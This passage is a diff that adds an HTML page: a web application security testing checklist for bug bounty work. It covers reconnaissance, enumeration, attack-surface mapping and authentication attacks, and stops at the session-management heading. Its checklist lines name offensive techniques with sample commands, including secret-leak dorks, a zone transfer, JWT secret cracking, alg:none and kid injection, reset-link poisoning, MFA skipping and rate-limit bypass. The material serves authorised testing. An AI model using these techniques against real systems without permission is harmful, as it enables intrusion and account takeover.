@@ -1,0 +1,832 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <meta name="description" content="Darshak Patel's world-class web application security testing checklist — 300+ items mapped to OWASP Top 10, CWE, and real bug bounty workflows." />
+  <title>Web App Security Checklist | Darshak Patel</title>
+  <link rel="stylesheet" href="../assets/css/style.css" />
+  <link rel="stylesheet" href="../assets/css/pages/methodology.css" />
+  <link rel="stylesheet" href="../assets/css/pages/checklist.css" />
+</head>
+<body>
+
+<canvas id="particles"></canvas>
+
+<nav>
+  <a href="../index.html" class="nav-logo"><span class="bracket">[</span>dp<span class="bracket">]</span></a>
+  <ul class="nav-links">
+    <li><a href="./about.html">about</a></li>
+    <li><a href="./expertise.html">expertise</a></li>
+    <li><a href="./certifications.html">certifications</a></li>
+    <li><a href="./achievements.html">achievements</a></li>
+    <li><a href="./tools.html">tools</a></li>
+    <li><a href="./resources.html" class="active">resources</a></li>
+    <li><a href="../blog/index.html">blog</a></li>
+    <li><a href="./contact.html">contact</a></li>
+  </ul>
+  <a href="mailto:your@email.com" class="nav-cta">Hire Me</a>
+  <div class="nav-hamburger"><span></span><span></span><span></span></div>
+</nav>
+
+<div class="page-header">
+  <p class="section-label">web app security</p>
+  <h1 class="section-title">Web App Security Checklist</h1>
+  <p class="section-sub">300+ items across 15 phases — mapped to OWASP Top 10, CWE IDs, and real bug bounty impact chains. The most comprehensive manual testing checklist available.</p>
+</div>
+
+<section class="cert-page-body">
+  <div class="container">
+
+    <div class="reports-page-back">
+      <a href="./resources.html" class="reports-back-link">
+        <svg viewBox="0 0 24 24"><polyline points="15 18 9 12 15 6"/></svg>
+        Back to Resources
+      </a>
+    </div>
+
+    <!-- Stats bar injected by JS -->
+    <div class="cl-stats-bar" id="cl-stats">
+      <div class="cl-stat"><span class="cl-stat-num" id="st-total">0</span><span class="cl-stat-label">Total Items</span></div>
+      <div class="cl-stat-divider"></div>
+      <div class="cl-stat"><span class="cl-stat-num" id="st-done">0</span><span class="cl-stat-label">Checked</span></div>
+      <div class="cl-stat-divider"></div>
+      <div class="cl-stat"><span class="cl-stat-num" id="st-crit" style="color:#f87171">0</span><span class="cl-stat-label">Critical</span></div>
+      <div class="cl-stat"><span class="cl-stat-num" id="st-high" style="color:#fb923c">0</span><span class="cl-stat-label">High</span></div>
+      <div class="cl-stat"><span class="cl-stat-num" id="st-med" style="color:#facc15">0</span><span class="cl-stat-label">Medium</span></div>
+      <div class="cl-stat-divider"></div>
+      <div class="cl-progress-wrap">
+        <div class="cl-progress-label"><span>Progress</span><span id="st-pct">0%</span></div>
+        <div class="cl-progress-track"><div class="cl-progress-fill" id="cl-prog-fill"></div></div>
+      </div>
+      <button class="cl-reset-btn" id="cl-reset">Reset All</button>
+    </div>
+
+    <!-- Toolbar -->
+    <div class="cl-toolbar">
+      <button class="cl-filter-btn active" data-filter="all">All</button>
+      <button class="cl-filter-btn" data-filter="crit">Critical</button>
+      <button class="cl-filter-btn" data-filter="high">High</button>
+      <button class="cl-filter-btn" data-filter="med">Medium</button>
+      <button class="cl-filter-btn" data-filter="low">Low</button>
+      <button class="cl-filter-btn" data-filter="unchecked">Unchecked</button>
+      <input type="text" class="cl-search" id="cl-search" placeholder="Search checklist..." />
+    </div>
+
+    <div id="cl-no-results" class="cl-no-results">No items match your filter or search.</div>
+
+    <!-- ── SECTION INDEX ──────────────────────────────── -->
+    <div class="mth-index reveal">
+      <p class="mth-index-label">Sections</p>
+      <div class="mth-index-pills">
+        <a href="#cl-1"  class="mth-pill">01 · Passive Recon</a>
+        <a href="#cl-2"  class="mth-pill">02 · Active Enumeration</a>
+        <a href="#cl-3"  class="mth-pill">03 · Surface Mapping</a>
+        <a href="#cl-4"  class="mth-pill">04 · Authentication</a>
+        <a href="#cl-5"  class="mth-pill">05 · Session Management</a>
+        <a href="#cl-6"  class="mth-pill">06 · Authorisation &amp; IDOR</a>
+        <a href="#cl-7"  class="mth-pill">07 · Injection</a>
+        <a href="#cl-8"  class="mth-pill">08 · XSS &amp; Client-Side</a>
+        <a href="#cl-9"  class="mth-pill">09 · SSRF</a>
+        <a href="#cl-10" class="mth-pill">10 · CSRF &amp; CORS</a>
+        <a href="#cl-11" class="mth-pill">11 · File Upload &amp; XXE</a>
+        <a href="#cl-12" class="mth-pill">12 · Business Logic</a>
+        <a href="#cl-13" class="mth-pill">13 · API &amp; GraphQL</a>
+        <a href="#cl-14" class="mth-pill">14 · Headers &amp; Config</a>
+        <a href="#cl-15" class="mth-pill">15 · Reporting</a>
+      </div>
+    </div>
+
+    <!-- ══════════════════════════════════════════════
+         01 — PASSIVE RECONNAISSANCE
+    ══════════════════════════════════════════════ -->
+    <div class="mth-phase reveal" id="cl-1" data-section="01">
+      <div class="mth-phase-header">
+        <span class="mth-num">01</span>
+        <div><h2 class="mth-phase-title">Passive Reconnaissance</h2><p class="mth-phase-sub">OSINT · ZERO TRAFFIC TO TARGET · FOOTPRINTING</p></div>
+      </div>
+      <div class="cl-grid">
+        <div class="cl-group">
+          <p class="cl-group-label">Subdomain &amp; Asset Discovery</p>
+          <label class="cl-item" data-sev="med"><input type="checkbox"><span class="cl-text">Certificate transparency logs — crt.sh, Censys, Facebook CT</span><span class="cl-sev sev-m">Med</span></label>
+          <label class="cl-item" data-sev="med"><input type="checkbox"><span class="cl-text">SecurityTrails, VirusTotal, Shodan subdomains for the target domain</span><span class="cl-sev sev-m">Med</span></label>
+          <label class="cl-item" data-sev="med"><input type="checkbox"><span class="cl-text">RapidDNS, DNSDumpster, Sublist3r for additional passive enumeration</span><span class="cl-sev sev-m">Med</span></label>
+          <label class="cl-item" data-sev="med"><input type="checkbox"><span class="cl-text">Wildcard cert SANs — grep Subject Alternative Names for hidden subdomains</span><span class="cl-sev sev-m">Med</span></label>
+          <label class="cl-item" data-sev="high"><input type="checkbox"><span class="cl-text">Identify ASN and IP ranges — <code>whois</code>, BGP Toolkit, Hurricane Electric</span><span class="cl-sev sev-h">High</span></label>
+          <label class="cl-item" data-sev="med"><input type="checkbox"><span class="cl-text">Reverse IP lookup — find other domains on shared hosting</span><span class="cl-sev sev-m">Med</span></label>
+          <label class="cl-item" data-sev="med"><input type="checkbox"><span class="cl-text">Archived URLs — <code>waybackurls</code>, <code>gau</code>, CommonCrawl, Katana passive mode</span><span class="cl-sev sev-m">Med</span></label>
+          <label class="cl-item" data-sev="high"><input type="checkbox"><span class="cl-text">Old endpoints in Wayback — legacy API keys, forgotten admin panels, dev routes</span><span class="cl-sev sev-h">High</span></label>
+        </div>
+        <div class="cl-group">
+          <p class="cl-group-label">Source Code &amp; Secrets Leakage</p>
+          <label class="cl-item" data-sev="crit"><input type="checkbox"><span class="cl-text">GitHub / GitLab / Bitbucket — search org name, domain, product name for leaked secrets</span><span class="cl-sev sev-c">Crit</span></label>
+          <label class="cl-item" data-sev="crit"><input type="checkbox"><span class="cl-text">TruffleHog / Gitleaks against found repositories</span><span class="cl-sev sev-c">Crit</span></label>
+          <label class="cl-item" data-sev="high"><input type="checkbox"><span class="cl-text">Search for <code>target.com</code> in public paste sites (Pastebin, Gist, GitLab snippets)</span><span class="cl-sev sev-h">High</span></label>
+          <label class="cl-item" data-sev="high"><input type="checkbox"><span class="cl-text">Google dorks: <code>site:target.com ext:env OR ext:sql OR ext:json OR ext:yaml</code></span><span class="cl-sev sev-h">High</span></label>
+          <label class="cl-item" data-sev="high"><input type="checkbox"><span class="cl-text">Google dorks: <code>site:target.com inurl:admin OR inurl:login OR inurl:dashboard</code></span><span class="cl-sev sev-h">High</span></label>
+          <label class="cl-item" data-sev="high"><input type="checkbox"><span class="cl-text">Google dorks: <code>site:target.com "internal use only" OR "not for distribution"</code></span><span class="cl-sev sev-h">High</span></label>
+          <label class="cl-item" data-sev="high"><input type="checkbox"><span class="cl-text">Google dorks: <code>site:target.com filetype:pdf OR filetype:docx</code> for sensitive docs</span><span class="cl-sev sev-h">High</span></label>
+          <label class="cl-item" data-sev="med"><input type="checkbox"><span class="cl-text">Bing / DuckDuckGo dorks — may index pages Google de-indexes</span><span class="cl-sev sev-m">Med</span></label>
+        </div>
+        <div class="cl-group">
+          <p class="cl-group-label">Infrastructure &amp; OSINT</p>
+          <label class="cl-item" data-sev="high"><input type="checkbox"><span class="cl-text">Shodan search for org's IP range — exposed ports, banners, default certs</span><span class="cl-sev sev-h">High</span></label>
+          <label class="cl-item" data-sev="high"><input type="checkbox"><span class="cl-text">Censys / FOFA — exposed cloud storage, Elasticsearch, Redis, Grafana instances</span><span class="cl-sev sev-h">High</span></label>
+          <label class="cl-item" data-sev="high"><input type="checkbox"><span class="cl-text">S3 bucket enumeration — <code>target.s3.amazonaws.com</code>, <code>s3-target</code> naming patterns</span><span class="cl-sev sev-h">High</span></label>
+          <label class="cl-item" data-sev="high"><input type="checkbox"><span class="cl-text">GCP / Azure blob storage — predictable naming, public access policies</span><span class="cl-sev sev-h">High</span></label>
+          <label class="cl-item" data-sev="med"><input type="checkbox"><span class="cl-text">LinkedIn — employee names, roles, tech stack mentions, job postings leak frameworks/cloud providers</span><span class="cl-sev sev-m">Med</span></label>
+          <label class="cl-item" data-sev="high"><input type="checkbox"><span class="cl-text">HaveIBeenPwned / DeHashed / LeakCheck for leaked credentials on the target domain</span><span class="cl-sev sev-h">High</span></label>
+          <label class="cl-item" data-sev="med"><input type="checkbox"><span class="cl-text">DNS history (SecurityTrails) — find old IPs that may still host internal services</span><span class="cl-sev sev-m">Med</span></label>
+          <label class="cl-item" data-sev="low"><input type="checkbox"><span class="cl-text">Email headers from newsletters — internal mail server IPs, cloud provider hints</span><span class="cl-sev sev-l">Low</span></label>
+        </div>
+        <div class="cl-group">
+          <p class="cl-group-label">Technology Fingerprinting (Passive)</p>
+          <label class="cl-item" data-sev="med"><input type="checkbox"><span class="cl-text">BuiltWith / Wappalyzer passive — identify CDN, CMS, analytics, framework versions</span><span class="cl-sev sev-m">Med</span></label>
+          <label class="cl-item" data-sev="high"><input type="checkbox"><span class="cl-text">Framework version → search NVD / ExploitDB for known CVEs</span><span class="cl-sev sev-h">High</span></label>
+          <label class="cl-item" data-sev="med"><input type="checkbox"><span class="cl-text">Third-party JS libraries identified → check Retire.js for known vulnerabilities</span><span class="cl-sev sev-m">Med</span></label>
+          <label class="cl-item" data-sev="low"><input type="checkbox"><span class="cl-text">robots.txt and sitemap.xml — lists paths the owner wants crawlers to skip (goldmine)</span><span class="cl-sev sev-l">Low</span></label>
+        </div>
+        <div class="cl-tip">
+          <span class="cl-tip-label">Pro Tip</span>
+          Always run passive recon before touching the target. Certificate transparency alone surfaces subdomains that DNS brute-force misses. Combine <code>crt.sh</code> + <code>subfinder</code> + <code>amass -passive</code> and deduplicate into a master list before moving to active enumeration.
+        </div>
+      </div>
+    </div>
+
+    <!-- ══════════════════════════════════════════════
+         02 — ACTIVE ENUMERATION
+    ══════════════════════════════════════════════ -->
+    <div class="mth-phase reveal" id="cl-2" data-section="02">
+      <div class="mth-phase-header">
+        <span class="mth-num">02</span>
+        <div><h2 class="mth-phase-title">Active Enumeration</h2><p class="mth-phase-sub">DNS BRUTE · PORT SCAN · DIRECTORY FUZZ · PARAM DISCOVERY</p></div>
+      </div>
+      <div class="cl-grid">
+        <div class="cl-group">
+          <p class="cl-group-label">DNS &amp; Subdomain</p>
+          <label class="cl-item" data-sev="med"><input type="checkbox"><span class="cl-text">DNS brute-force with <code>puredns</code> + <code>dnsx</code> + SecLists <code>dns/subdomains-top1million.txt</code></span><span class="cl-sev sev-m">Med</span></label>
+          <label class="cl-item" data-sev="med"><input type="checkbox"><span class="cl-text">Subdomain permutation with <code>gotator</code> — <code>dev-api</code>, <code>staging</code>, <code>internal</code>, <code>test</code> patterns</span><span class="cl-sev sev-m">Med</span></label>
+          <label class="cl-item" data-sev="high"><input type="checkbox"><span class="cl-text">Wildcard DNS detection — avoid false positives before trusting resolved results</span><span class="cl-sev sev-h">High</span></label>
+          <label class="cl-item" data-sev="med"><input type="checkbox"><span class="cl-text"><code>httpx</code> over all resolved subdomains — status, title, tech, redirect chains, screenshot</span><span class="cl-sev sev-m">Med</span></label>
+          <label class="cl-item" data-sev="high"><input type="checkbox"><span class="cl-text">Zone transfer attempt: <code>dig axfr @ns1.target.com target.com</code></span><span class="cl-sev sev-h">High</span></label>
+          <label class="cl-item" data-sev="high"><input type="checkbox"><span class="cl-text">DNS cache snooping — check resolver caches for evidence of internal hosts</span><span class="cl-sev sev-h">High</span></label>
+          <label class="cl-item" data-sev="med"><input type="checkbox"><span class="cl-text">DNSSEC misconfiguration — zone walking via NSEC records</span><span class="cl-sev sev-m">Med</span></label>
+          <label class="cl-item" data-sev="high"><input type="checkbox"><span class="cl-text">Subdomain takeover check — dangling CNAMEs pointing to unclaimed cloud services</span><span class="cl-sev sev-h">High</span></label>
+        </div>
+        <div class="cl-group">
+          <p class="cl-group-label">Port &amp; Service Scanning</p>
+          <label class="cl-item" data-sev="high"><input type="checkbox"><span class="cl-text">Nmap full TCP port scan: <code>nmap -p- -sV -sC --open -T4</code> on all in-scope IPs</span><span class="cl-sev sev-h">High</span></label>
+          <label class="cl-item" data-sev="high"><input type="checkbox"><span class="cl-text">Non-standard HTTP(S) ports — 8080, 8443, 8888, 9000, 3000, 4000, 5000</span><span class="cl-sev sev-h">High</span></label>
+          <label class="cl-item" data-sev="crit"><input type="checkbox"><span class="cl-text">Exposed admin services — Jenkins, Grafana, Kibana, Consul, Kubernetes dashboard, Portainer</span><span class="cl-sev sev-c">Crit</span></label>
+          <label class="cl-item" data-sev="crit"><input type="checkbox"><span class="cl-text">Exposed databases — MySQL 3306, PostgreSQL 5432, Redis 6379, MongoDB 27017, Elasticsearch 9200</span><span class="cl-sev sev-c">Crit</span></label>
+          <label class="cl-item" data-sev="high"><input type="checkbox"><span class="cl-text">Docker API on port 2375/2376 — unauthenticated container management = RCE</span><span class="cl-sev sev-h">High</span></label>
+          <label class="cl-item" data-sev="high"><input type="checkbox"><span class="cl-text">SMTP (25/587) open relay test — can external users relay mail?</span><span class="cl-sev sev-h">High</span></label>
+          <label class="cl-item" data-sev="med"><input type="checkbox"><span class="cl-text">UDP scan on key ports — DNS 53, SNMP 161 (community strings), NTP 123</span><span class="cl-sev sev-m">Med</span></label>
+        </div>
+        <div class="cl-group">
+          <p class="cl-group-label">Directory &amp; File Fuzzing</p>
+          <label class="cl-item" data-sev="med"><input type="checkbox"><span class="cl-text">FFUF directory fuzz — <code>raft-large-directories-lowercase.txt</code> against all live hosts</span><span class="cl-sev sev-m">Med</span></label>
+          <label class="cl-item" data-sev="high"><input type="checkbox"><span class="cl-text">Backup &amp; temp files: <code>.bak</code>, <code>.old</code>, <code>~</code>, <code>.swp</code>, <code>.orig</code>, <code>.copy</code>, <code>.1</code></span><span class="cl-sev sev-h">High</span></label>
+          <label class="cl-item" data-sev="crit"><input type="checkbox"><span class="cl-text">Config &amp; secrets files: <code>.env</code>, <code>.env.local</code>, <code>config.php</code>, <code>database.yml</code>, <code>secrets.json</code>, <code>web.config</code></span><span class="cl-sev sev-c">Crit</span></label>
+          <label class="cl-item" data-sev="high"><input type="checkbox"><span class="cl-text">Version control exposure: <code>/.git/HEAD</code>, <code>/.git/config</code>, <code>/.svn/entries</code>, <code>/.hg/</code></span><span class="cl-sev sev-h">High</span></label>
+          <label class="cl-item" data-sev="high"><input type="checkbox"><span class="cl-text">API docs: <code>/swagger.json</code>, <code>/openapi.yaml</code>, <code>/api-docs</code>, <code>/v1/swagger</code>, <code>/graphql</code></span><span class="cl-sev sev-h">High</span></label>
+          <label class="cl-item" data-sev="high"><input type="checkbox"><span class="cl-text">Admin panels: <code>/admin</code>, <code>/administrator</code>, <code>/manage</code>, <code>/dashboard</code>, <code>/cms</code>, <code>/wp-admin</code></span><span class="cl-sev sev-h">High</span></label>
+          <label class="cl-item" data-sev="med"><input type="checkbox"><span class="cl-text">Debug &amp; monitoring: <code>/debug</code>, <code>/trace</code>, <code>/actuator</code>, <code>/metrics</code>, <code>/_health</code>, <code>/status</code></span><span class="cl-sev sev-m">Med</span></label>
+          <label class="cl-item" data-sev="high"><input type="checkbox"><span class="cl-text">Log files: <code>/logs/</code>, <code>/error.log</code>, <code>/access.log</code>, <code>/debug.log</code></span><span class="cl-sev sev-h">High</span></label>
+        </div>
+        <div class="cl-group">
+          <p class="cl-group-label">Parameter Discovery</p>
+          <label class="cl-item" data-sev="med"><input type="checkbox"><span class="cl-text">Arjun on all discovered endpoints — hidden GET and POST parameters</span><span class="cl-sev sev-m">Med</span></label>
+          <label class="cl-item" data-sev="med"><input type="checkbox"><span class="cl-text">Param Miner (Burp extension) — web cache poisoning &amp; hidden header parameters</span><span class="cl-sev sev-m">Med</span></label>
+          <label class="cl-item" data-sev="med"><input type="checkbox"><span class="cl-text">Fuzz common param names: <code>id</code>, <code>user</code>, <code>token</code>, <code>debug</code>, <code>test</code>, <code>admin</code>, <code>redirect</code>, <code>url</code></span><span class="cl-sev sev-m">Med</span></label>
+          <label class="cl-item" data-sev="high"><input type="checkbox"><span class="cl-text">Extract params from archived URLs (<code>gau</code>) and Burp site map — build a comprehensive parameter list</span><span class="cl-sev sev-h">High</span></label>
+        </div>
+      </div>
+    </div>
+
+    <!-- ══════════════════════════════════════════════
+         03 — ATTACK SURFACE MAPPING
+    ══════════════════════════════════════════════ -->
+    <div class="mth-phase reveal" id="cl-3" data-section="03">
+      <div class="mth-phase-header">
+        <span class="mth-num">03</span>
+        <div><h2 class="mth-phase-title">Attack Surface Mapping</h2><p class="mth-phase-sub">BURP PROXY · JS ANALYSIS · MULTI-ROLE BROWSE · API SCHEMA</p></div>
+      </div>
+      <div class="cl-grid">
+        <div class="cl-group">
+          <p class="cl-group-label">Manual Browse &amp; Proxy</p>
+          <label class="cl-item" data-sev="high"><input type="checkbox"><span class="cl-text">Proxy all traffic through Burp Suite — capture complete site map</span><span class="cl-sev sev-h">High</span></label>
+          <label class="cl-item" data-sev="high"><input type="checkbox"><span class="cl-text">Walk every user flow: onboarding, profile, settings, payments, uploads, search, admin</span><span class="cl-sev sev-h">High</span></label>
+          <label class="cl-item" data-sev="high"><input type="checkbox"><span class="cl-text">Create 2 accounts at each privilege level — keep in separate browsers for role comparison</span><span class="cl-sev sev-h">High</span></label>
+          <label class="cl-item" data-sev="med"><input type="checkbox"><span class="cl-text">Catalogue all numeric/sequential IDs, GUIDs, hashed references in requests</span><span class="cl-sev sev-m">Med</span></label>
+          <label class="cl-item" data-sev="med"><input type="checkbox"><span class="cl-text">Note all JWT tokens, OAuth tokens, custom headers, cookies — document their structure</span><span class="cl-sev sev-m">Med</span></label>
+          <label class="cl-item" data-sev="high"><input type="checkbox"><span class="cl-text">Identify state-changing requests (anything that modifies data) — CSRF testing targets</span><span class="cl-sev sev-h">High</span></label>
+        </div>
+        <div class="cl-group">
+          <p class="cl-group-label">JavaScript Source Analysis</p>
+          <label class="cl-item" data-sev="high"><input type="checkbox"><span class="cl-text">Beautify and deobfuscate all JS bundles — use js-beautify / prettier</span><span class="cl-sev sev-h">High</span></label>
+          <label class="cl-item" data-sev="high"><input type="checkbox"><span class="cl-text">LinkFinder / relative-url-extractor — pull all hidden API routes, endpoints, and paths</span><span class="cl-sev sev-h">High</span></label>
+          <label class="cl-item" data-sev="crit"><input type="checkbox"><span class="cl-text">Grep for secrets: API keys, AWS access keys, Firebase config, Stripe keys, hardcoded passwords</span><span class="cl-sev sev-c">Crit</span></label>
+          <label class="cl-item" data-sev="high"><input type="checkbox"><span class="cl-text">Source maps (<code>.js.map</code> files) — often expose full unminified source code</span><span class="cl-sev sev-h">High</span></label>
+          <label class="cl-item" data-sev="high"><input type="checkbox"><span class="cl-text">Feature-flagged routes in JS — functionality present in code but not exposed in UI</span><span class="cl-sev sev-h">High</span></label>
+          <label class="cl-item" data-sev="med"><input type="checkbox"><span class="cl-text">Identify client-side routing — SPA routes often map directly to protected API endpoints</span><span class="cl-sev sev-m">Med</span></label>
+          <label class="cl-item" data-sev="med"><input type="checkbox"><span class="cl-text">Retire.js / <code>npm audit</code> — flag known vulnerable front-end library versions</span><span class="cl-sev sev-m">Med</span></label>
+        </div>
+        <div class="cl-group">
+          <p class="cl-group-label">API Schema Discovery</p>
+          <label class="cl-item" data-sev="high"><input type="checkbox"><span class="cl-text">REST: probe <code>/api/v1</code>–<code>v5</code>, versioned path patterns, <code>/swagger.json</code>, <code>/openapi.yaml</code></span><span class="cl-sev sev-h">High</span></label>
+          <label class="cl-item" data-sev="crit"><input type="checkbox"><span class="cl-text">GraphQL: run introspection query, map all types / mutations / queries with GraphQL Voyager</span><span class="cl-sev sev-c">Crit</span></label>
+          <label class="cl-item" data-sev="high"><input type="checkbox"><span class="cl-text">GraphQL: look for deprecated mutations and hidden admin resolvers not shown in docs</span><span class="cl-sev sev-h">High</span></label>
+          <label class="cl-item" data-sev="med"><input type="checkbox"><span class="cl-text">Mobile API reverse engineering — Apktool / jadx / objection for app-specific API routes</span><span class="cl-sev sev-m">Med</span></label>
+          <label class="cl-item" data-sev="high"><input type="checkbox"><span class="cl-text">Postman collections or OpenAPI specs in GitHub — often include internal or test environments</span><span class="cl-sev sev-h">High</span></label>
+        </div>
+        <div class="cl-group">
+          <p class="cl-group-label">Cookie &amp; Token Inventory</p>
+          <label class="cl-item" data-sev="med"><input type="checkbox"><span class="cl-text">Document all cookies: name, value encoding, flags (Secure, HttpOnly, SameSite), domain/path scope</span><span class="cl-sev sev-m">Med</span></label>
+          <label class="cl-item" data-sev="high"><input type="checkbox"><span class="cl-text">Decode all base64-encoded or serialised cookie values — check for object injection vectors</span><span class="cl-sev sev-h">High</span></label>
+          <label class="cl-item" data-sev="high"><input type="checkbox"><span class="cl-text">JWT tokens — decode header + payload, note algorithm, note all claims, check for sensitive data in payload</span><span class="cl-sev sev-h">High</span></label>
+          <label class="cl-item" data-sev="med"><input type="checkbox"><span class="cl-text">CSRF token presence — which requests include it and which don't</span><span class="cl-sev sev-m">Med</span></label>
+        </div>
+      </div>
+    </div>
+
+    <!-- ══════════════════════════════════════════════
+         04 — AUTHENTICATION
+    ══════════════════════════════════════════════ -->
+    <div class="mth-phase reveal" id="cl-4" data-section="04">
+      <div class="mth-phase-header">
+        <span class="mth-num">04</span>
+        <div><h2 class="mth-phase-title">Authentication</h2><p class="mth-phase-sub">JWT · OAUTH · MFA · PASSWORD RESET · BRUTE-FORCE · SSO</p></div>
+      </div>
+      <div class="cl-grid">
+        <div class="cl-group">
+          <p class="cl-group-label">JWT Attacks</p>
+          <label class="cl-item" data-sev="crit"><input type="checkbox"><span class="cl-text"><code>alg:none</code> — set algorithm to none, strip signature entirely, send unsigned token</span><span class="cl-sev sev-c">Crit</span></label>
+          <label class="cl-item" data-sev="crit"><input type="checkbox"><span class="cl-text">Algorithm confusion RS256 → HS256 — sign token with the server's RSA public key as HMAC secret</span><span class="cl-sev sev-c">Crit</span></label>
+          <label class="cl-item" data-sev="high"><input type="checkbox"><span class="cl-text">Weak secret brute-force — <code>hashcat -a 0 -m 16500 token.txt rockyou.txt</code> or <code>jwt_tool -C</code></span><span class="cl-sev sev-h">High</span></label>
+          <label class="cl-item" data-sev="crit"><input type="checkbox"><span class="cl-text"><code>kid</code> header injection — path traversal: <code>../../dev/null</code> with empty secret; SQL injection in <code>kid</code> param</span><span class="cl-sev sev-c">Crit</span></label>
+          <label class="cl-item" data-sev="crit"><input type="checkbox"><span class="cl-text"><code>jku</code> / <code>x5u</code> header spoofing — point to attacker-controlled JWKS endpoint</span><span class="cl-sev sev-c">Crit</span></label>
+          <label class="cl-item" data-sev="high"><input type="checkbox"><span class="cl-text">Modify JWT claims — <code>role</code>, <code>email</code>, <code>user_id</code>, <code>admin</code>, <code>scope</code> without valid signature</span><span class="cl-sev sev-h">High</span></label>
+          <label class="cl-item" data-sev="high"><input type="checkbox"><span class="cl-text">JWT expiry — test with expired token: is <code>exp</code> claim validated server-side?</span><span class="cl-sev sev-h">High</span></label>
+          <label class="cl-item" data-sev="med"><input type="checkbox"><span class="cl-text">Sensitive data in JWT payload — PII, internal IDs, or secrets that shouldn't be client-visible</span><span class="cl-sev sev-m">Med</span></label>
+          <label class="cl-item" data-sev="high"><input type="checkbox"><span class="cl-text">JWT not invalidated after logout — old tokens still accepted by server</span><span class="cl-sev sev-h">High</span></label>
+        </div>
+        <div class="cl-group">
+          <p class="cl-group-label">OAuth 2.0 / OIDC</p>
+          <label class="cl-item" data-sev="crit"><input type="checkbox"><span class="cl-text"><code>redirect_uri</code> bypass — whitelist escape via path traversal, subdomain, open redirect chain</span><span class="cl-sev sev-c">Crit</span></label>
+          <label class="cl-item" data-sev="high"><input type="checkbox"><span class="cl-text">Missing or reused <code>state</code> parameter — CSRF on OAuth authorisation initiation</span><span class="cl-sev sev-h">High</span></label>
+          <label class="cl-item" data-sev="high"><input type="checkbox"><span class="cl-text">Auth code reuse — code accepted a second time (no one-time use enforcement)</span><span class="cl-sev sev-h">High</span></label>
+          <label class="cl-item" data-sev="high"><input type="checkbox"><span class="cl-text">PKCE absent in public clients — allows auth code interception attack</span><span class="cl-sev sev-h">High</span></label>
+          <label class="cl-item" data-sev="high"><input type="checkbox"><span class="cl-text">Implicit flow — access token in URL fragment leaks via Referer header and browser history</span><span class="cl-sev sev-h">High</span></label>
+          <label class="cl-item" data-sev="high"><input type="checkbox"><span class="cl-text">Scope escalation — request broader scopes than the application requires</span><span class="cl-sev sev-h">High</span></label>
+          <label class="cl-item" data-sev="crit"><input type="checkbox"><span class="cl-text">Account linking / pre-account takeover — register with victim's email via OAuth before they do</span><span class="cl-sev sev-c">Crit</span></label>
+          <label class="cl-item" data-sev="high"><input type="checkbox"><span class="cl-text">Token leakage in Referer header when navigating from OAuth callback page</span><span class="cl-sev sev-h">High</span></label>
+        </div>
+        <div class="cl-group">
+          <p class="cl-group-label">Password Reset &amp; Registration</p>
+          <label class="cl-item" data-sev="crit"><input type="checkbox"><span class="cl-text">Reset token predictability — PRNG-based, timestamp-derived, or incremental tokens</span><span class="cl-sev sev-c">Crit</span></label>
+          <label class="cl-item" data-sev="high"><input type="checkbox"><span class="cl-text">Reset token reuse — token valid after password has already been changed</span><span class="cl-sev sev-h">High</span></label>
+          <label class="cl-item" data-sev="high"><input type="checkbox"><span class="cl-text">Reset token long expiry — valid for more than 15 minutes (ideally single-use + short TTL)</span><span class="cl-sev sev-h">High</span></label>
+          <label class="cl-item" data-sev="crit"><input type="checkbox"><span class="cl-text">Host header injection — poison reset email link to attacker-controlled domain</span><span class="cl-sev sev-c">Crit</span></label>
+          <label class="cl-item" data-sev="med"><input type="checkbox"><span class="cl-text">Username enumeration — distinct error messages or timing differences between valid/invalid users</span><span class="cl-sev sev-m">Med</span></label>
+          <label class="cl-item" data-sev="high"><input type="checkbox"><span class="cl-text">Password reset poisoning — <code>X-Forwarded-Host</code> header replaces domain in reset link</span><span class="cl-sev sev-h">High</span></label>
+          <label class="cl-item" data-sev="med"><input type="checkbox"><span class="cl-text">Registration with duplicate email — case variation, Unicode normalisation, whitespace tricks</span><span class="cl-sev sev-m">Med</span></label>
+          <label class="cl-item" data-sev="high"><input type="checkbox"><span class="cl-text">Registration with disposable/plus-address email bypasses domain restrictions</span><span class="cl-sev sev-h">High</span></label>
+        </div>
+        <div class="cl-group">
+          <p class="cl-group-label">MFA &amp; Rate Limiting</p>
+          <label class="cl-item" data-sev="crit"><input type="checkbox"><span class="cl-text">Skip MFA step — navigate directly to post-auth URL after first factor only</span><span class="cl-sev sev-c">Crit</span></label>
+          <label class="cl-item" data-sev="high"><input type="checkbox"><span class="cl-text">OTP reuse — same TOTP accepted more than once within the time window</span><span class="cl-sev sev-h">High</span></label>
+          <label class="cl-item" data-sev="crit"><input type="checkbox"><span class="cl-text">Response manipulation — change <code>"mfa_required":true</code> → <code>false</code> in intercepted response</span><span class="cl-sev sev-c">Crit</span></label>
+          <label class="cl-item" data-sev="high"><input type="checkbox"><span class="cl-text">Brute-force 6-digit OTP — 1,000,000 combinations, test for rate limiting and lockout</span><span class="cl-sev sev-h">High</span></label>
+          <label class="cl-item" data-sev="high"><input type="checkbox"><span class="cl-text">Backup code exhaustion / enumeration — are codes randomly generated and single-use?</span><span class="cl-sev sev-h">High</span></label>
+          <label class="cl-item" data-sev="high"><input type="checkbox"><span class="cl-text">Rate limit bypass — <code>X-Forwarded-For</code>, <code>X-Real-IP</code>, <code>X-Originating-IP</code>, <code>CF-Connecting-IP</code> header rotation</span><span class="cl-sev sev-h">High</span></label>
+          <label class="cl-item" data-sev="high"><input type="checkbox"><span class="cl-text">No rate limit on login endpoint — credential stuffing / password spray possible</span><span class="cl-sev sev-h">High</span></label>
+          <label class="cl-item" data-sev="med"><input type="checkbox"><span class="cl-text">Account lockout threshold — too low (DoS), too high (brute-force), or missing entirely</span><span class="cl-sev sev-m">Med</span></label>
+        </div>
+        <div class="cl-chain">
+          <span class="cl-chain-label">🔗 Attack Chain — Account Takeover</span>
+          <div class="cl-chain-steps">
+            <span class="cl-chain-step">Host header injection</span><span class="cl-chain-arrow">→</span>
+            <span class="cl-chain-step">Poison reset link</span><span class="cl-chain-arrow">→</span>
+            <span class="cl-chain-step">Victim clicks link</span><span class="cl-chain-arrow">→</span>
+            <span class="cl-chain-step">Token captured</span><span class="cl-chain-arrow">→</span>
+            <span class="cl-chain-step">Full ATO</span>
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <!-- ══════════════════════════════════════════════
+         05 — SESSION MANAGEMENT
+    ══════════════════════════════════════════════ -->
+    <div class="mth-phase reveal" id="cl-5" data-section="05">
+      <div class="mth-phase-header">
+        <span class="mth-num">05</span>
